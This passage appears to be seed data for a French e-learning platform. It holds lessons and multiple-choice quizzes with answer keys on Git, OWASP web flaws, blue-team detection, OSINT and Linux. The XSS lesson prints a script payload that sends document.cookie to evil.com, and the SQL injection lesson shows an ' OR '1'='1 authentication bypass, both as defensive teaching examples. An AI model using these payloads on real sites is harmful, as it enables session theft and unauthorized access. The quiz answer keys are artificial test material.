    level: 2,
    lessons: [
      {
        order: 1,
        title: "Branches : isoler le travail en cours",
        content:
          "Une **branche** Git est un pointeur mobile vers un commit — créer une branche est quasi instantané et ne duplique pas les fichiers, contrairement à ce qu'on pourrait imaginer.\n\n" +
          "```bash\ngit checkout -b feature/login   # crée et bascule sur une nouvelle branche\ngit add .\ngit commit -m \"add login form\"\ngit push -u origin feature/login\n```\n\n" +
          "Le workflow classique : chaque fonctionnalité/correctif se développe sur sa propre branche, isolée de `main` (qui reste toujours stable/déployable), puis est fusionnée via une **Pull Request** après revue de code — jamais de commit direct sur `main` en équipe.",
        xpReward: 20,
        questions: [
          {
            order: 1,
            prompt: "Que représente techniquement une branche Git ?",
            choices: [
              "Une copie complète et indépendante de tous les fichiers du projet",
              "Un pointeur mobile vers un commit — sa création est quasi instantanée",
              "Un dossier séparé sur le disque dur",
              "Un fichier de configuration Git spécial",
            ],
            correctIndex: 1,
            explanation:
              "Une branche n'est qu'une référence légère vers un commit — Git ne duplique aucun fichier à sa création, ce qui la rend quasi instantanée même sur un très gros dépôt.",
          },
          {
            order: 2,
            prompt: "Pourquoi éviter les commits directs sur `main` en travail d'équipe ?",
            choices: [
              "Git l'interdit techniquement",
              "Ça empêche la revue de code (Pull Request) et risque de casser une branche censée rester stable/déployable",
              "`main` ne peut contenir aucun commit",
              "C'est plus lent que de committer sur une autre branche",
            ],
            correctIndex: 1,
            explanation:
              "Passer par une Pull Request permet une revue avant fusion et garde `main` toujours dans un état stable — un commit direct contourne ce filet de sécurité collectif.",
          },
        ],
      },
      {
        order: 2,
        title: "Rebase vs Merge",
        content:
          "`git merge` et `git rebase` intègrent tous deux les changements d'une branche dans une autre, mais différemment :\n\n" +
          "- `git merge feature` : crée un **commit de fusion** qui relie les deux historiques — préserve l'historique exact tel qu'il s'est déroulé, mais peut rendre le log plus difficile à lire (branches entrelacées).\n" +
          "- `git rebase main` (depuis `feature`) : **rejoue** les commits de `feature` par-dessus la dernière version de `main`, un par un — produit un historique linéaire, plus lisible, mais réécrit les hash de commits.\n\n" +
          "Règle d'or : ne jamais `rebase` une branche déjà partagée/poussée sur laquelle d'autres personnes travaillent — réécrire l'historique casse la synchronisation de leurs copies locales. Rebase est sûr sur une branche locale/personnelle pas encore partagée.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Quelle est la différence principale entre `git merge` et `git rebase` ?",
            choices: [
              "`merge` ne fonctionne que sur GitHub, `rebase` en local uniquement",
              "`merge` crée un commit de fusion préservant l'historique tel quel ; `rebase` rejoue les commits par-dessus l'autre branche, produisant un historique linéaire",
              "Ce sont des synonymes exacts",
              "`rebase` supprime définitivement les commits de la branche",
            ],
            correctIndex: 1,
            explanation:
              "`merge` garde une trace exacte de la façon dont les branches ont divergé et se sont recombinées (commit de fusion) ; `rebase` réécrit l'historique pour donner l'impression que le travail s'est fait de façon linéaire.",
          },
          {
            order: 2,
            prompt: "Pourquoi ne faut-il jamais rebaser une branche déjà partagée avec d'autres développeurs ?",
            choices: [
              "Git l'interdit techniquement et refuse la commande",
              "Le rebase réécrit les hash des commits, désynchronisant les copies locales des autres personnes qui travaillent sur la même branche",
              "Ça n'a aucune conséquence, c'est juste une convention arbitraire",
              "Ça supprime tous les fichiers du dépôt distant",
            ],
            correctIndex: 1,
            explanation:
              "Le rebase crée de nouveaux commits avec de nouveaux hash pour remplacer les anciens — quiconque a déjà les anciens commits en local se retrouve avec un historique divergent et incompatible.",
          },
        ],
      },
      {
        order: 3,
        title: "Résoudre un conflit de fusion",
        content:
          "Un **conflit** survient quand Git ne peut pas fusionner automatiquement deux changements sur les mêmes lignes d'un fichier. Git marque la zone en conflit directement dans le fichier :\n\n" +
          "```\n<<<<<<< HEAD\nconst greeting = \"Bonjour\";\n=======\nconst greeting = \"Salut\";\n>>>>>>> feature/greeting\n```\n\n" +
          "Résolution : éditer le fichier pour garder la version voulue (ou combiner les deux), supprimer les marqueurs `<<<<<<<`/`=======`/`>>>>>>>`, puis `git add <fichier>` et `git commit` (pour un merge) ou `git rebase --continue` (pour un rebase) pour valider la résolution. `git status` liste toujours les fichiers encore en conflit — ne jamais committer en laissant des marqueurs de conflit oubliés dans le code.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que représentent les marqueurs `<<<<<<<`, `=======` et `>>>>>>>` dans un fichier ?",
            choices: [
              "Une erreur de syntaxe à corriger dans le code lui-même",
              "Les deux versions en conflit d'une même zone du fichier, insérées par Git pour que le développeur choisisse laquelle garder",
              "Un commentaire spécial généré automatiquement à ignorer",
              "Une commande Git à exécuter",
            ],
            correctIndex: 1,
            explanation:
              "Git ne peut pas décider seul laquelle des deux versions garder sur les lignes en conflit — il insère les deux, séparées par ces marqueurs, pour que le développeur tranche manuellement.",
          },
          {
            order: 2,
            prompt: "Après avoir résolu un conflit dans un fichier, quelle est la prochaine étape avant de finaliser un merge ?",
            choices: [
              "Rien, Git détecte automatiquement la résolution",
              "`git add <fichier>` puis `git commit` pour valider la résolution",
              "Supprimer complètement le fichier",
              "Relancer `git clone` du dépôt entier",
            ],
            correctIndex: 1,
            explanation:
              "Après avoir édité le fichier pour retirer les marqueurs et garder la version voulue, il faut `git add` le fichier résolu puis `git commit` pour indiquer à Git que le conflit est réglé.",
          },
        ],
      },
    ],
  },
  {
    key: "web-vulnerabilities-owasp",
    title: "Vulnérabilités Web (OWASP)",
    description: "Comprendre les failles web les plus courantes — XSS, injection SQL, CSRF, SSRF — pour savoir les reconnaître et s'en protéger.",
    category: "CYBERSECURITY",
    skillKey: "web-security",
    level: 3,
    prerequisiteCourseKeys: ["cyber-fundamentals"],
    lessons: [
      {
        order: 1,
        title: "XSS : injection de script côté client",
        content:
          "Le **Cross-Site Scripting (XSS)** survient quand une application affiche du contenu fourni par un utilisateur sans le neutraliser (échapper), permettant l'exécution de JavaScript arbitraire dans le navigateur d'une victime.\n\n" +
          "```html\n<!-- Un commentaire utilisateur affiché sans échappement -->\n<div>Commentaire : <script>fetch('https://evil.com?cookie='+document.cookie)</script></div>\n```\n\n" +
          "Trois familles : **Stored** (le script malveillant est enregistré en base et affiché à chaque visiteur), **Reflected** (le script vient d'un paramètre d'URL renvoyé directement dans la page), **DOM-based** (la faille est purement côté client, dans du JS qui manipule le DOM avec des données non fiables). Défense principale : **échapper systématiquement** tout contenu utilisateur affiché (encoder `<`, `>`, `&`...), et utiliser une **Content Security Policy** restrictive en défense supplémentaire.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Qu'est-ce qui rend une application vulnérable au XSS ?",
            choices: [
              "Utiliser une base de données SQL",
              "Afficher du contenu fourni par un utilisateur sans l'échapper, permettant l'exécution de JavaScript arbitraire dans le navigateur d'une victime",
              "Avoir un mot de passe trop court",
              "Utiliser HTTPS au lieu de HTTP",
            ],
            correctIndex: 1,
            explanation:
              "Le XSS exploite précisément l'absence d'échappement du contenu utilisateur affiché — sans neutralisation, ce contenu peut contenir du HTML/JS interprété par le navigateur de la victime.",
          },
          {
            order: 2,
            prompt: "Quelle est la différence entre un XSS « Stored » et un XSS « Reflected » ?",
            choices: [
              "Aucune différence réelle",
              "Le Stored enregistre le script malveillant en base (affecte chaque visiteur) ; le Reflected vient d'un paramètre d'URL renvoyé directement dans la réponse",
              "Le Reflected est toujours plus dangereux que le Stored",
              "Le Stored ne fonctionne que sur des sites sans base de données",
            ],
            correctIndex: 1,
            explanation:
              "Un XSS Stored persiste en base de données et touche potentiellement tous les visiteurs de la page concernée ; un Reflected dépend d'un lien piégé contenant le payload dans l'URL, envoyé à une victime spécifique.",
          },
        ],
      },
      {
        order: 2,
        title: "Injection SQL",
        content:
          "L'**injection SQL** survient quand une entrée utilisateur est concaténée directement dans une requête SQL, permettant de modifier la logique de la requête elle-même.\n\n" +
          "```js\n// VULNÉRABLE — ne jamais faire ça\nconst query = `SELECT * FROM users WHERE email = '${email}'`;\n// Si email = \"' OR '1'='1\", la requête devient :\n// SELECT * FROM users WHERE email = '' OR '1'='1'\n// → retourne TOUS les utilisateurs, contournant l'authentification\n```\n\n" +
          "Défense : les **requêtes préparées** (paramétrées) séparent strictement le code SQL des données fournies — la base de données ne peut jamais interpréter une donnée comme du code SQL, quelle que soit la valeur envoyée.\n\n" +
          "```js\n// SÛR\ndb.query('SELECT * FROM users WHERE email = ?', [email]);\n```\n\n" +
          "Un ORM bien utilisé (voir le cours SQL/ORM) génère des requêtes paramétrées par défaut — c'est l'une des raisons pour lesquelles il protège nativement contre l'injection SQL, sans effort supplémentaire du développeur.",
        xpReward: 30,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi `SELECT * FROM users WHERE email = '${email}'` (concaténation directe) est-il dangereux ?",
            choices: [
              "Ce n'est pas dangereux, c'est juste moins performant",
              "Un attaquant peut fournir une valeur qui modifie la structure même de la requête SQL exécutée",
              "Ça ne fonctionne qu'avec des bases de données NoSQL",
              "Ça ralentit systématiquement la requête",
            ],
            correctIndex: 1,
            explanation:
              "La concaténation directe traite l'entrée utilisateur comme du code SQL — une valeur comme `' OR '1'='1` change la logique de la clause `WHERE` elle-même, pas juste sa valeur.",
          },
          {
            order: 2,
            prompt: "Pourquoi une requête préparée (paramétrée) empêche-t-elle l'injection SQL ?",
            choices: [
              "Elle chiffre automatiquement toutes les données",
              "Elle sépare strictement le code SQL des données fournies — la base ne peut jamais interpréter une donnée comme du code",
              "Elle est simplement plus rapide à exécuter",
              "Elle empêche toute connexion à la base de données",
            ],
            correctIndex: 1,
            explanation:
              "Avec une requête paramétrée, la structure SQL est fixée à l'avance et les valeurs sont transmises séparément — même une valeur malveillante reste traitée comme une simple donnée, jamais comme du code exécutable.",
          },
        ],
      },
      {
        order: 3,
        title: "CSRF et SSRF",
        content:
          "**CSRF** (Cross-Site Request Forgery) : un site malveillant fait exécuter une requête non désirée par le navigateur d'une victime déjà authentifiée sur un autre site (le navigateur envoie automatiquement les cookies de session existants). Ex: une image cachée pointant vers `banque.com/transferer?montant=1000&vers=attaquant` — si la victime est connectée à sa banque, la requête part avec ses cookies valides. Défense : tokens CSRF (valeur imprévisible incluse dans chaque formulaire, vérifiée côté serveur) et attribut de cookie `SameSite`.\n\n" +
          "**SSRF** (Server-Side Request Forgery) : le serveur lui-même est manipulé pour effectuer une requête vers une destination contrôlée ou choisie par l'attaquant — souvent via une fonctionnalité légitime (« importer une image depuis une URL »). Un attaquant peut cibler `http://localhost/admin` ou des métadonnées cloud internes (`http://169.254.169.254/`), normalement inaccessibles depuis l'extérieur mais accessibles depuis le serveur lui-même. Défense : valider/restreindre strictement les URLs autorisées (liste blanche de domaines), jamais faire confiance à une URL fournie par l'utilisateur sans filtrage.",
        xpReward: 30,
        questions: [
          {
            order: 1,
            prompt: "Dans une attaque CSRF, pourquoi le navigateur de la victime envoie-t-il une requête authentifiée sans que la victime le sache ?",
            choices: [
              "Le navigateur envoie automatiquement les cookies de session existants avec toute requête vers le domaine concerné, même déclenchée depuis un autre site",
              "L'attaquant a volé le mot de passe de la victime au préalable",
              "CSRF ne fonctionne que si la victime clique explicitement sur un bouton « autoriser »",
              "Le navigateur demande toujours confirmation avant d'envoyer une requête",
            ],
            correctIndex: 0,
            explanation:
              "C'est précisément le mécanisme exploité : le navigateur attache automatiquement les cookies existants à toute requête vers le domaine correspondant, peu importe la page qui a déclenché la requête.",
          },
          {
            order: 2,
            prompt: "Qu'est-ce qui distingue le SSRF du CSRF ?",
            choices: [
              "Ce sont des synonymes exacts",
              "Dans le SSRF, c'est le SERVEUR lui-même qui est manipulé pour faire une requête (souvent vers des ressources internes normalement inaccessibles), pas le navigateur d'une victime",
              "Le SSRF ne concerne que les bases de données",
              "Le CSRF est toujours plus dangereux que le SSRF",
            ],
            correctIndex: 1,
            explanation:
              "Le CSRF exploite le navigateur d'une victime authentifiée ; le SSRF exploite le serveur lui-même via une fonctionnalité légitime détournée, pour atteindre des ressources internes normalement protégées du réseau externe.",
          },
        ],
      },
    ],
  },
  {
    key: "blue-team-fundamentals",
    title: "Blue Team : détection et réponse",
    description: "L'autre côté de la cybersécurité : analyser des logs, détecter des indicateurs de compromission, réagir à un incident et durcir un système.",
    category: "CYBERSECURITY",
    skillKey: "blue-team-fundamentals",
    level: 3,
    prerequisiteCourseKeys: ["cyber-fundamentals"],
    lessons: [
      {
        order: 1,
        title: "Analyse de logs et IOC",
        content:
          "Un **IOC** (Indicator Of Compromise) est un signal observable qui suggère une compromission possible : une adresse IP suspecte, un hash de fichier malveillant connu, une connexion à une heure inhabituelle, un volume de trafic anormal.\n\n" +
          "Exemple de log suspect à repérer : une authentification réussie à 03h14 un dimanche depuis un pays sans employé de l'entreprise, immédiatement suivie d'un accès à des fichiers sensibles jamais consultés par ce compte auparavant — chaque élément pris seul est faible, mais leur combinaison forme un signal fort.\n\n" +
          "Les analystes blue team ne cherchent pas qu'un événement isolé mais des **patterns** : plusieurs échecs de connexion suivis d'un succès (indice de brute force réussi), une même IP touchant des dizaines de comptes différents (credential stuffing), un processus normal (`powershell.exe`) lancé depuis un emplacement inhabituel (indice de détournement d'un outil légitime, technique dite « living off the land »).",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Que signifie l'acronyme IOC en cybersécurité ?",
            choices: [
              "Internet Origin Control",
              "Indicator Of Compromise",
              "Internal Operations Center",
              "Isolated Object Container",
            ],
            correctIndex: 1,
            explanation:
              "IOC = Indicator Of Compromise, un signal observable (IP, hash, comportement) qui suggère qu'un système a potentiellement été compromis.",
          },
          {
            order: 2,
            prompt: "Pourquoi un analyste blue team cherche-t-il des « patterns » plutôt qu'un seul événement isolé ?",
            choices: [
              "Un seul événement suffit toujours à confirmer une attaque",
              "Un événement isolé est souvent faible en soi, mais la combinaison de plusieurs signaux (heure inhabituelle, comportement anormal, échecs répétés) forme un signal bien plus fiable",
              "Les logs individuels ne contiennent jamais d'information utile",
              "Chercher des patterns ralentit toujours la détection",
            ],
            correctIndex: 1,
            explanation:
              "Un seul indicateur (ex: une connexion à 3h du matin) peut avoir une explication légitime — c'est la corrélation de plusieurs signaux anormaux ensemble qui rend la détection fiable et actionnable.",
          },
        ],
      },
      {
        order: 2,
        title: "SIEM et détection",
        content:
          "Un **SIEM** (Security Information and Event Management) centralise les logs de multiples sources (serveurs, pare-feux, applications, endpoints) pour permettre une corrélation à grande échelle — impossible à faire manuellement sur des millions d'événements par jour.\n\n" +
          "Le SIEM applique des **règles de détection** : des conditions qui, si satisfaites, génèrent une alerte. Ex: « plus de 10 échecs de connexion sur le même compte en moins de 5 minutes » ou « connexion réussie depuis deux pays différents à moins d'une heure d'intervalle » (« impossible travel »).\n\n" +
          "Un défi majeur : le réglage des règles. Trop sensibles → **faux positifs** massifs qui noient les analystes (fatigue d'alerte, un vrai incident peut passer inaperçu dans le bruit) ; trop larges → **faux négatifs**, de vraies attaques non détectées. Affiner les règles de détection est un travail continu, pas une configuration figée une fois pour toutes.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Quel est le rôle principal d'un SIEM ?",
            choices: [
              "Bloquer automatiquement toutes les attaques sans intervention humaine",
              "Centraliser les logs de multiples sources pour permettre une corrélation et une détection à grande échelle",
              "Remplacer entièrement le besoin d'un pare-feu",
              "Chiffrer les communications réseau",
            ],
            correctIndex: 1,
            explanation:
              "Un SIEM agrège et corrèle des logs venant de nombreuses sources différentes — un volume qu'aucun analyste ne pourrait traiter manuellement en temps réel sans cet outil.",
          },
          {
            order: 2,
            prompt: "Quel est le risque concret d'avoir des règles de détection SIEM trop sensibles ?",
            choices: [
              "Aucun risque, plus de sensibilité est toujours préférable",
              "Un volume massif de faux positifs qui noie les analystes (fatigue d'alerte), risquant de faire passer un vrai incident inaperçu dans le bruit",
              "Le SIEM cesse complètement de fonctionner",
              "Ça ralentit uniquement les performances réseau",
            ],
            correctIndex: 1,
            explanation:
              "Des règles trop larges génèrent trop d'alertes non pertinentes — les analystes finissent par ignorer ou traiter superficiellement les alertes par lassitude, ce qui peut masquer une vraie menace parmi le bruit.",
          },
        ],
      },
      {
        order: 3,
        title: "Réponse à incident et hardening",
        content:
          "La **réponse à incident** suit généralement un cycle en phases : **Préparation** (plans, outils, formations avant qu'un incident survienne) → **Détection/Analyse** (confirmer et qualifier l'incident) → **Confinement** (isoler les systèmes touchés pour empêcher la propagation) → **Éradication** (supprimer la cause : malware, accès non autorisé) → **Récupération** (restaurer les systèmes sains, en confiance) → **Retour d'expérience** (documenter ce qui s'est passé pour améliorer la préparation future).\n\n" +
          "Le **hardening** (durcissement) est l'ensemble des mesures préventives qui réduisent la surface d'attaque avant même qu'un incident survienne : désactiver les services inutilisés, appliquer le principe du **moindre privilège** (chaque compte/service n'a que les accès strictement nécessaires), maintenir les correctifs de sécurité à jour, désactiver les comptes/mots de passe par défaut. Le hardening et la réponse à incident sont complémentaires : mieux un système est durci, moins d'incidents surviennent — mais aucun système n'est invulnérable, d'où la nécessité d'un plan de réponse prêt à l'avance plutôt qu'improvisé en pleine crise.",
        xpReward: 30,
        questions: [
          {
            order: 1,
            prompt: "Dans le cycle de réponse à incident, que se passe-t-il durant la phase de « Confinement » ?",
            choices: [
              "On restaure immédiatement tous les systèmes à leur état normal",
              "On isole les systèmes touchés pour empêcher la propagation de l'incident, avant de chercher à l'éliminer complètement",
              "On documente uniquement ce qui s'est passé pour plus tard",
              "On désactive tous les logs pour éviter d'aggraver la situation",
            ],
            correctIndex: 1,
            explanation:
              "Le confinement vient avant l'éradication : l'objectif immédiat est d'empêcher l'incident de s'étendre à d'autres systèmes, avant de chercher à supprimer sa cause racine.",
          },
          {
            order: 2,
            prompt: "Qu'est-ce que le « principe du moindre privilège » dans une démarche de hardening ?",
            choices: [
              "Donner à chaque compte/service uniquement les accès strictement nécessaires à sa fonction, rien de plus",
              "Donner un accès administrateur à tous les comptes par défaut pour simplifier la gestion",
              "Interdire complètement tout accès à tous les systèmes",
              "Un principe qui ne s'applique qu'aux mots de passe",
            ],
            correctIndex: 0,
            explanation:
              "Le moindre privilège réduit la surface d'attaque : si un compte est compromis, l'attaquant n'hérite que des accès strictement nécessaires à ce compte, pas de privilèges superflus qui élargiraient les dégâts possibles.",
          },
        ],
      },
    ],
  },
  {
    key: "osint-social-engineering",
    title: "OSINT et ingénierie sociale",
    description: "Techniques de reconnaissance à partir de sources publiques, et comprendre l'ingénierie sociale d'un point de vue défensif.",
    category: "CYBERSECURITY",
    skillKey: "red-team-fundamentals",
    level: 3,
    prerequisiteCourseKeys: ["redteam-fundamentals"],
    lessons: [
      {
        order: 1,
        title: "Qu'est-ce que l'OSINT ?",
        content:
          "⚠️ Comme pour tout le contenu Red Team de Nodify : uniquement dans un cadre autorisé (pentest, bug bounty, veille défensive sur sa propre organisation).\n\n" +
          "L'**OSINT** (Open Source Intelligence) consiste à collecter et analyser des informations provenant exclusivement de sources **publiques et légales** : réseaux sociaux, sites web d'entreprise, dépôts de code publics, moteurs de recherche, enregistrements DNS/WHOIS publics.\n\n" +
          "Contrairement à d'autres phases d'un test d'intrusion, l'OSINT ne touche jamais directement le système cible — c'est purement de la collecte passive, indétectable par la cible elle-même. Un attaquant l'utilise pour cartographier une organisation avant de passer à des phases plus actives ; un défenseur l'utilise pour découvrir ce qu'un attaquant pourrait voir de sa propre organisation, et corriger les fuites d'information avant qu'elles ne soient exploitées.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "En quoi l'OSINT diffère-t-il des autres phases d'un test d'intrusion (comme le scan de ports) ?",
            choices: [
              "L'OSINT nécessite un accès direct au système cible",
              "L'OSINT est purement passif — il collecte uniquement des informations publiques, sans jamais interagir directement avec le système cible",
              "L'OSINT est toujours illégal, contrairement aux autres phases",
              "L'OSINT ne peut être utilisé que par des attaquants, jamais par des défenseurs",
            ],
            correctIndex: 1,
            explanation:
              "L'OSINT reste passif et invisible pour la cible (recherche d'informations déjà publiques) — c'est justement pour ça qu'il est indétectable, contrairement à un scan de ports qui laisse une trace dans les logs de la cible.",
          },
          {
            order: 2,
            prompt: "Pourquoi une organisation aurait-elle intérêt à faire elle-même de l'OSINT sur son propre nom ?",
            choices: [
              "Ça n'a aucune utilité défensive",
              "Pour découvrir quelles informations sensibles sont déjà exposées publiquement, et les corriger avant qu'un attaquant ne les exploite",
              "C'est illégal de faire de l'OSINT sur sa propre organisation",
              "Uniquement pour des raisons de marketing",
            ],
            correctIndex: 1,
            explanation:
              "Se voir « depuis l'extérieur » via l'OSINT permet à une organisation de repérer des fuites d'information (métadonnées de documents, employés trop bavards sur les réseaux, sous-domaines oubliés) avant qu'un vrai attaquant ne le fasse.",
          },
        ],
      },
      {
        order: 2,
        title: "Sources et techniques courantes",
        content:
          "Quelques sources OSINT classiques : le **WHOIS** (informations d'enregistrement d'un nom de domaine, parfois l'organisation propriétaire), les **enregistrements DNS publics** (sous-domaines révélant une infrastructure interne, ex: `staging.entreprise.com`), les **métadonnées de documents** publiés (auteur, logiciel utilisé, parfois chemin de fichier local révélé dans un PDF/Office), les **réseaux sociaux professionnels** (organigramme reconstituable, technologies utilisées mentionnées dans des offres d'emploi), les **dépôts de code publics** (un `.env` ou une clé API accidentellement committée et jamais retirée de l'historique git).\n\n" +
          "Le principe du **« oversharing »** (partage excessif) est central : chaque information publiée séparément peut sembler anodine, mais leur combinaison (nom + entreprise + localisation + horaires habituels) peut suffire à construire un profil exploitable pour du spear phishing ciblé.",
        xpReward: 30,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi un sous-domaine comme `staging.entreprise.com`, découvert via les enregistrements DNS publics, est-il intéressant pour un attaquant ?",
            choices: [
              "Il ne présente aucun intérêt particulier",
              "Il révèle potentiellement l'existence d'un environnement de test, souvent moins sécurisé/durci qu'un environnement de production",
              "Il donne directement le mot de passe administrateur",
              "Les sous-domaines ne sont jamais visibles publiquement",
            ],
            correctIndex: 1,
            explanation:
              "Un environnement de staging/test est souvent moins prioritaire en termes de durcissement de sécurité qu'un environnement de production — sa découverte élargit la surface d'attaque exploitable.",
          },
          {
            order: 2,
            prompt: "Que désigne le principe de « oversharing » en contexte OSINT ?",
            choices: [
              "Publier volontairement de fausses informations pour tromper un attaquant",
              "La combinaison d'informations individuellement anodines qui, mises ensemble, forment un profil exploitable pour une attaque ciblée",
              "Un type de chiffrement des données personnelles",
              "Une technique de défense contre le phishing",
            ],
            correctIndex: 1,
            explanation:
              "Aucune information isolée n'est forcément dangereuse seule, mais leur accumulation (identité, employeur, localisation, habitudes) permet de construire un profil précis exploitable pour un spear phishing crédible.",
          },
        ],
      },
      {
        order: 3,
        title: "Ingénierie sociale : le facteur humain",
        content:
          "L'**ingénierie sociale** exploite la psychologie humaine plutôt qu'une faille technique — manipuler quelqu'un pour qu'il effectue une action ou révèle une information qu'il n'aurait normalement pas dû partager.\n\n" +
          "Leviers psychologiques classiques : l'**autorité** (se faire passer pour un supérieur ou un service IT), l'**urgence** (créer une pression temporelle qui court-circuite la réflexion), la **confiance** (exploiter une relation ou une familiarité apparente), la **réciprocité** (rendre un petit service pour en demander un plus grand ensuite), la **curiosité** (une clé USB « perdue » intentionnellement dans un parking d'entreprise).\n\n" +
          "La défense principale n'est pas purement technique : c'est la **formation et la culture de vérification** — encourager systématiquement à vérifier une demande inhabituelle par un canal indépendant (rappeler la personne sur un numéro connu, plutôt que de répondre directement à un email/appel suspect), sans jamais culpabiliser une personne qui a des doutes et prend le temps de vérifier.",
        xpReward: 30,
        questions: [
          {
            order: 1,
            prompt: "Pourquoi une clé USB « perdue » intentionnellement dans un parking d'entreprise est-elle un vecteur d'ingénierie sociale efficace ?",
            choices: [
              "Elle contient toujours un virus détecté immédiatement",
              "Elle exploite la curiosité naturelle d'une personne qui la trouve et la branche pour voir ce qu'elle contient",
              "Ce n'est pas un vecteur réaliste, ça n'arrive jamais en pratique",
              "Elle ne fonctionne que sur du matériel Windows",
            ],
            correctIndex: 1,
            explanation:
              "C'est un classique de l'ingénierie sociale (« USB drop attack ») : la curiosité pousse souvent une personne à brancher un appareil trouvé pour identifier son propriétaire, exécutant potentiellement du code malveillant au passage.",
          },
          {
            order: 2,
            prompt: "Quelle est la meilleure défense contre une demande urgente et inhabituelle reçue par email/téléphone (ex: « transfère ces fonds immédiatement, c'est le PDG ») ?",
            choices: [
              "Exécuter la demande immédiatement pour ne pas décevoir un supérieur",
              "Vérifier la demande par un canal indépendant connu (rappeler sur un numéro déjà enregistré), avant d'agir",
              "Ignorer complètement toute communication urgente",
              "Transférer la demande à toute l'entreprise pour vérification collective",
            ],
            correctIndex: 1,
            explanation:
              "L'urgence artificielle est justement le levier utilisé pour empêcher la vérification — reprendre le contrôle en vérifiant par un canal indépendant et déjà connu (pas les coordonnées fournies dans le message suspect lui-même) neutralise ce levier.",
          },
        ],
      },
    ],
  },
  {
    key: "linux-shell-scripting",
    title: "Linux avancé : shell scripting et processus",
    description: "Aller au-delà des commandes de base : automatiser avec des scripts bash, comprendre la gestion des processus et des permissions en profondeur.",
    category: "SYSTEMS",
    skillKey: "linux",
    level: 3,
    prerequisiteCourseKeys: ["linux-fundamentals"],
    lessons: [
      {
        order: 1,
        title: "Écrire un script bash",
        content:
          "Un script bash automatise une séquence de commandes qu'on exécuterait autrement à la main. Il commence par un **shebang** (`#!/bin/bash`) qui indique quel interpréteur utiliser.\n\n" +
          "```bash\n#!/bin/bash\nNOM=\"Nodify\"\nif [ -d \"/var/log/$NOM\" ]; then\n  echo \"Le dossier de logs existe déjà\"\nelse\n  mkdir -p \"/var/log/$NOM\"\n  echo \"Dossier créé\"\nfi\n```\n\n" +
          "`$NOM` référence une variable, `[ -d ... ]` teste si un chemin est un dossier existant, `mkdir -p` crée le dossier (et ses parents manquants) sans erreur s'il existe déjà. Un script doit être rendu exécutable (`chmod +x script.sh`) avant de pouvoir être lancé directement avec `./script.sh`.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "À quoi sert la ligne `#!/bin/bash` au tout début d'un script ?",
            choices: [
              "C'est juste un commentaire décoratif sans effet",
              "Elle indique au système quel interpréteur utiliser pour exécuter le script",
              "Elle chiffre le contenu du script",
              "Elle définit le nom du script",
            ],
            correctIndex: 1,
            explanation:
              "Le shebang (`#!`) dit au système d'exploitation quel programme doit interpréter le reste du fichier — ici `/bin/bash`, l'interpréteur bash.",
          },
          {
            order: 2,
            prompt: "Que faut-il faire avant de pouvoir lancer un script avec `./script.sh` ?",
            choices: [
              "Rien, ça fonctionne toujours directement", "Le rendre exécutable avec `chmod +x script.sh`", "Le renommer en `.exe`", "Le compiler avec `gcc`",
            ],
            correctIndex: 1,
            explanation:
              "Un fichier script n'est pas exécutable par défaut sur Linux — `chmod +x` ajoute le bit d'exécution, nécessaire pour le lancer directement via `./script.sh`.",
          },
        ],
      },
      {
        order: 2,
        title: "Gestion des processus",
        content:
          "Chaque programme en cours d'exécution est un **processus**, identifié par un PID (Process ID) unique. `ps aux` liste les processus actifs ; `top`/`htop` les affiche en temps réel avec leur consommation CPU/mémoire.\n\n" +
          "```bash\nps aux | grep node        # trouve les processus Node.js en cours\nkill 1234                 # envoie SIGTERM (arrêt propre) au PID 1234\nkill -9 1234               # envoie SIGKILL (arrêt forcé, immédiat)\n```\n\n" +
          "`SIGTERM` (par défaut) demande poliment au processus de s'arrêter, lui laissant l'occasion de nettoyer proprement (fermer des fichiers, sauvegarder un état) ; `SIGKILL` (`-9`) le termine immédiatement sans lui laisser aucune chance de réagir — à utiliser en dernier recours, un processus tué ainsi ne peut pas nettoyer derrière lui.",
        xpReward: 25,
        questions: [
          {
            order: 1,
            prompt: "Quelle est la différence entre `kill 1234` et `kill -9 1234` ?",
            choices: [
              "Aucune différence, ce sont des synonymes",
              "`kill` seul envoie SIGTERM (arrêt propre, le processus peut nettoyer avant de s'arrêter) ; `kill -9` envoie SIGKILL (arrêt forcé immédiat, sans possibilité de nettoyage)",
              "`kill -9` est toujours plus lent",
              "`kill` seul ne fonctionne que sur les processus root",
            ],
            correctIndex: 1,
            explanation:
              "SIGTERM laisse une chance au processus de gérer sa propre terminaison proprement ; SIGKILL (signal 9) ne peut être ni intercepté ni ignoré par le processus — il est tué immédiatement, sans nettoyage possible.",
          },
          {
            order: 2,
            prompt: "À quoi sert le PID d'un processus ?",
            choices: [
              "À l'identifier de façon unique parmi tous les processus en cours, pour pouvoir le cibler (ex: avec `kill`)",
              "À définir ses permissions d'accès aux fichiers",
              "À indiquer sa consommation mémoire",
              "À le rendre exécutable",
            ],
            correctIndex: 0,
            explanation:
              "Le PID (Process ID) est l'identifiant unique attribué à chaque processus en cours d'exécution — indispensable pour cibler précisément un processus avec des commandes comme `kill`.",
          },
        ],
      },
      {
        order: 3,
        title: "Permissions en profondeur",
        content:
          "Les permissions Linux (`rwx` pour propriétaire/groupe/autres, vues via `ls -l`) contrôlent qui peut lire, écrire ou exécuter un fichier — mais deux bits spéciaux méritent une attention particulière côté sécurité.\n\n" +
          "Le bit **SUID** (`chmod u+s fichier`) fait exécuter un programme avec les privilèges de son **propriétaire** plutôt que de l'utilisateur qui le lance — un script SUID appartenant à root, mal sécurisé, est une source classique d'élévation de privilèges. Le bit **sticky** sur un dossier (`chmod +t dossier`, visible via le `t` final dans `drwxrwxrwt`, ex: `/tmp`) empêche un utilisateur de supprimer les fichiers d'un autre utilisateur dans ce dossier partagé, même s'il a un accès en écriture au dossier lui-même.\n\n" +
          "`umask` définit les permissions par défaut retirées à la création d'un nouveau fichier/dossier — un `umask` trop permissif (ex: `000`) crée par défaut des fichiers accessibles en écriture à tout le monde, un risque de sécurité facilement évitable.",
        xpReward: 30,
        questions: [
          {
            order: 1,
            prompt: "Que fait le bit SUID sur un exécutable ?",
            choices: [
              "Il chiffre automatiquement le fichier",
